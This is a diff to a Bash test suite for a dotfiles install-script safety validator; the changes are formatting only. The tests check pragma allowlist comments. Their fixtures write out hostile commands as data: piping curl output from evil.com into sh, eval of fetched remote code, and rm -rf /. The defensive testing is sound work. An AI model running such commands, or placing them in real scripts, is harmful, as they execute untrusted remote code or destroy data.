@@ -39,10 +39,10 @@ validate_install_sh_safe() {
         while IFS= read -r matched_line; do
             # Issue #103: Check for pragma allowlist comment
             if echo "$matched_line" | grep -qE '#[[:space:]]*pragma:[[:space:]]*allowlist[[:space:]]+[A-Za-z0-9_-]+'; then
-                continue  # Pragma allows this pattern
+                continue # Pragma allows this pattern
             fi
-            return 1  # Pattern found without pragma
-        done < <(grep -E "$pattern" "$install_script" 2>/dev/null || true)
+            return 1 # Pattern found without pragma
+        done < <(grep -E "$pattern" "$install_script" 2> /dev/null || true)
     done
 
     return 0
@@ -85,7 +85,7 @@ test_pragma_allows_curl_pipe_in_echo() {
     test_start "Pragma allows documented curl pipe in echo statement"
     setup_test_dotfiles
 
-    cat > "$TEST_DOTFILES/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES/install.sh" << 'EOF'
 #!/bin/bash
 # Documentation showing installation method
 echo "Quick install: curl https://starship.rs/install.sh | sh"  # pragma: allowlist RCE-001
@@ -95,7 +95,7 @@ EOF
     chmod 644 "$TEST_DOTFILES/install.sh"
 
     # Should PASS validation (pragma allows this pattern)
-    if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
+    if validate_install_sh_safe "$TEST_DOTFILES" 2> /dev/null; then
         pass "Pragma correctly allowed documented pattern"
     else
         fail "Pragma should allow documented pattern" "validation passes" "validation failed"
@@ -108,7 +108,7 @@ test_pragma_allows_wget_pipe_in_printf() {
     test_start "Pragma allows documented wget pipe in printf statement"
     setup_test_dotfiles
 
-    cat > "$TEST_DOTFILES/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES/install.sh" << 'EOF'
 #!/bin/bash
 printf "Alternative: wget -O - https://example.com/install.sh | bash\n"  # pragma: allowlist RCE-002
 mkdir -p ~/.config
@@ -116,7 +116,7 @@ EOF
 
     chmod 644 "$TEST_DOTFILES/install.sh"
 
-    if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
+    if validate_install_sh_safe "$TEST_DOTFILES" 2> /dev/null; then
         pass "Pragma correctly allowed wget pattern"
     else
         fail "Pragma should allow wget pattern" "validation passes" "validation failed"
@@ -129,7 +129,7 @@ test_without_pragma_pattern_still_caught() {
     test_start "Without pragma, dangerous pattern is still caught"
     setup_test_dotfiles
 
-    cat > "$TEST_DOTFILES/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES/install.sh" << 'EOF'
 #!/bin/bash
 # No pragma on this line
 echo "Install: curl https://example.com | sh"
@@ -138,7 +138,7 @@ EOF
     chmod 644 "$TEST_DOTFILES/install.sh"
 
     # Should FAIL validation (no pragma, pattern caught)
-    if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
+    if validate_install_sh_safe "$TEST_DOTFILES" 2> /dev/null; then
         fail "Without pragma, pattern should be caught" "validation fails" "validation passed"
     else
         pass "Pattern correctly caught without pragma"
@@ -151,7 +151,7 @@ test_pragma_only_affects_specific_line() {
     test_start "Pragma only affects the line it's on, not others"
     setup_test_dotfiles
 
-    cat > "$TEST_DOTFILES/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES/install.sh" << 'EOF'
 #!/bin/bash
 echo "Safe doc: curl | sh"  # pragma: allowlist RCE-003
 curl https://evil.com | sh
@@ -160,7 +160,7 @@ EOF
     chmod 644 "$TEST_DOTFILES/install.sh"
 
     # Should FAIL validation (second line has no pragma)
-    if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
+    if validate_install_sh_safe "$TEST_DOTFILES" 2> /dev/null; then
         fail "Actual RCE without pragma should be caught" "validation fails" "validation passed"
     else
         pass "Pragma correctly scoped to single line"
@@ -173,7 +173,7 @@ test_pragma_with_descriptive_name() {
     test_start "Pragma accepts descriptive pattern names"
     setup_test_dotfiles
 
-    cat > "$TEST_DOTFILES/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES/install.sh" << 'EOF'
 #!/bin/bash
 echo "Install starship: curl -sS https://starship.rs/install.sh | sh"  # pragma: allowlist curl-pipe-bash-doc
 ln -s source target
@@ -181,7 +181,7 @@ EOF
 
     chmod 644 "$TEST_DOTFILES/install.sh"
 
-    if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
+    if validate_install_sh_safe "$TEST_DOTFILES" 2> /dev/null; then
         pass "Pragma with descriptive name accepted"
     else
         fail "Descriptive pragma name should work" "validation passes" "validation failed"
@@ -194,7 +194,7 @@ test_pragma_with_eval_pattern() {
     test_start "Pragma allows eval in documentation"
     setup_test_dotfiles
 
-    cat > "$TEST_DOTFILES/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES/install.sh" << 'EOF'
 #!/bin/bash
 echo "Never do this: eval \$(dangerous)"  # pragma: allowlist EVAL-001
 mkdir -p ~/.local
@@ -202,7 +202,7 @@ EOF
 
     chmod 644 "$TEST_DOTFILES/install.sh"
 
-    if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
+    if validate_install_sh_safe "$TEST_DOTFILES" 2> /dev/null; then
         pass "Pragma allowed eval in documentation"
     else
         fail "Pragma should allow eval pattern" "validation passes" "validation failed"
@@ -215,7 +215,7 @@ test_actual_eval_without_pragma_caught() {
     test_start "Actual eval without pragma is caught"
     setup_test_dotfiles
 
-    cat > "$TEST_DOTFILES/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES/install.sh" << 'EOF'
 #!/bin/bash
 eval "$(curl https://evil.com)"
 EOF
@@ -223,7 +223,7 @@ EOF
     chmod 644 "$TEST_DOTFILES/install.sh"
 
     # Should FAIL validation
-    if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
+    if validate_install_sh_safe "$TEST_DOTFILES" 2> /dev/null; then
         fail "Actual eval should be caught" "validation fails" "validation passed"
     else
         pass "Eval correctly caught without pragma"
@@ -236,7 +236,7 @@ test_pragma_format_variations() {
     test_start "Pragma works with whitespace variations"
     setup_test_dotfiles
 
-    cat > "$TEST_DOTFILES/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES/install.sh" << 'EOF'
 #!/bin/bash
 echo "Test1: curl | sh"  #pragma:allowlist RCE-004
 echo "Test2: curl | sh"  # pragma:allowlist RCE-005
@@ -246,7 +246,7 @@ EOF
 
     chmod 644 "$TEST_DOTFILES/install.sh"
 
-    if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
+    if validate_install_sh_safe "$TEST_DOTFILES" 2> /dev/null; then
         pass "Pragma works with whitespace variations"
     else
         fail "Pragma should handle whitespace" "validation passes" "validation failed"
@@ -263,7 +263,7 @@ test_regression_rm_rf_still_caught() {
     test_start "REGRESSION: rm -rf / still caught (existing CVE-2)"
     setup_test_dotfiles
 
-    cat > "$TEST_DOTFILES/install.sh" <<'EOF'
+    cat > "$TEST_DOTFILES/install.sh" << 'EOF'
 #!/bin/bash
 rm -rf /
 EOF
@@ -271,7 +271,7 @@ EOF
     chmod 644 "$TEST_DOTFILES/install.sh"
 
     # Should FAIL validation
-    if validate_install_sh_safe "$TEST_DOTFILES" 2>/dev/null; then
+    if validate_install_sh_safe "$TEST_DOTFILES" 2> /dev/null; then
         fail "rm -rf / should be caught" "validation fails" "validation passed"
     else
         pass "Existing CVE-2 pattern still caught (no regression)"
